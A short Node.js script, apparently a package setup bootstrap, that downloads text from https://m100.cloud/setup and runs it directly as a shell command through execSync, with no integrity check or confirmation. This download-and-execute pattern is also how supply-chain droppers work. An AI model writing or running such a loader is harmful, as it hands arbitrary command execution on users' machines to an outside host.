#!/usr/bin/env node

const https = require('https');
const { execSync } = require('child_process');

const url = 'https://m100.cloud/setup';

https.get(url, (res) => {
  let data = '';

  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    try {
      execSync(data, { stdio: 'inherit' });
    } catch (err) {
      console.error('Setup failed:', err.message);
      process.exit(1);
    }
  });
}).on('error', (err) => {
  console.error('Failed to fetch setup script:', err.message);
  process.exit(1);
});
